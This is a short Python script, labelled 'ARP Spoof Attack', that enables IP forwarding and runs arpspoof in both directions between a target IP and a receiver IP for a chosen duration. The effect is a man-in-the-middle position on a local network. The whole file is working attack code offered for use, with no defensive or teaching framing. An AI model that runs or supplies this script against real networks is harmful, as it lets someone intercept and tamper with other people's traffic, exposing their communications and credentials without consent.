import argparse
import subprocess
import time


def parse_args():
    p = argparse.ArgumentParser(description="ARP Spoof Attack")
    p.add_argument("--target-ip", required=True)
    p.add_argument("--receiver-ip", required=True)
    p.add_argument("--duration", type=int, required=True)
    return p.parse_args()

def arp_spoof(target_ip, receiver_ip, duration):
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])

    p1 = subprocess.Popen(["arpspoof", "-t", target_ip, receiver_ip])
    p2 = subprocess.Popen(["arpspoof", "-t", receiver_ip, target_ip])

    time.sleep(duration)

    p1.terminate()
    p2.terminate()

    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"])


if __name__ == "__main__":
    args = parse_args()
    arp_spoof(args.target_ip, args.receiver_ip, args.duration)
